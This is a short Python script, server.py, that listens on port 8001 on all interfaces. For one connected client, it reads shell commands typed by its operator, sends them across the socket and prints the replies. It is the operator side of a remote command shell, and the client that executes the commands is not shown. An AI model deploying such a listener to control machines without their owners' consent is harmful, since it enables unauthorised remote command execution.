# server.py
import socket

HOST = '0.0.0.0'  # Listen on all interfaces
PORT = 8001

def main():
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind((HOST, PORT))
        server.listen()
        print(f"Server listening on {HOST}:{PORT}")
        
        conn, addr = server.accept()
        with conn:
            print(f"Connected by {addr}")
            try:
                while True:
                    code = input("Enter shell command to execute: ")
                    if code.lower() in ('exit', 'quit'):
                        break
                    conn.sendall(code.encode())
                    response = conn.recv(4096).decode()
                    print("Client Response:\n", response)
            except KeyboardInterrupt:
                print("\nKeyboard interrupt received. Closing connection.")
            finally:
                conn.close()
                server.close()
                

if __name__ == "__main__":
    main()